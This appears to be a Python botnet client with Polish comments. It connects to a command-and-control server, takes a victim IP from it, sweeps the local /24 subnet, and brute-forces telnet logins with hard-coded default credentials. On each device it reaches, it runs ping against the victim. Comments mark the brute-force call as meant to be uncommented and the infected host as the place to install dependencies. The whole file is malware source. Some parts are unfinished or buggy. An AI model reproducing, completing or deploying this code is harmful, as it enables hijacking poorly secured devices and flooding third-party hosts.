import socket
import time
import xtelnet


#       ^
#       |
# nie jest defaultowo zainstalowane -> można uruchomić proces na zainfekowanym hoście tj. run(pip3 install xtelnet)

# from requests import get       ->       można publiczny ip używać    w sumie nie wiem po co xD


def telnetConnect(ip_address, victimIP):
    t = xtelnet.session()
    # można zrobić pętlę do wczytywania user credentials z pliku
    users = ['admin', 'root', 'user', '1234', 'administrator']
    passwords = ['1234', 'toor', '4321', 'admin', 'root', 'user']

    for user in users:
        for password in passwords:
            t.connect(ip_address, username=user, password=password, p=23, timeout=5)
            output1 = t.execute('ping ' + victimIP)
            print(output1)

    t.close()


def checkForOtherDevices(ip, victimIP):
    x = 0
    l = len(ip)
    g = ip.split('.')[-1]
    ip = ip[:l - len(g)]

    while x < 254:
        current_address = ip + str(x)
        # próbuj połączyć z każdym przez telnet (używając np pliku z loginem i hasłem)
        # telnetConnect(current_address,victimIP) --> w wątku chyba???                      do odkomentowania!!!
        x += 1
        # print(current_address)


if __name__ == '__main__':

    HOST = '127.0.0.1'  # The server's hostname or IP address
    PORT = 65432  # The port used by the server

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        flag = 0
        while True:

            while flag != 1:
                time.sleep(0.5)
                try:
                    print('trying to connect...')
                    s.connect((HOST, PORT))
                    # send info to host that a bot is connected
                    s.send('1'.encode())
                    # checkForOtherDevices(HOST)
                    flag = 1
                except:
                    print('nie udało sie połączyć')
                    s.close()
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    flag = 0
                    continue
                time.sleep(1)
                print("Connection established!")

            try:
                data = str(s.recv(1024).decode())
                print('Received', str(data))
                if str(data) == '1':

                    victim_ip = s.recv(1024).decode()
                    print('victim address:' + str(victim_ip))
                    checkForOtherDevices(HOST, victim_ip)

                elif data == 2:

                    HOST = s.recv(1024)
                    s.close()

                else:
                    print('something went wrong')
            except:
                flag = 0
                # s.close()
                continue

            # ip = get('https://api.ipify.org').text
            # print('public IP address: {}'.format(ip))
            # print('operating port: {}'.format(PORT))

            # print('Received', str(data))
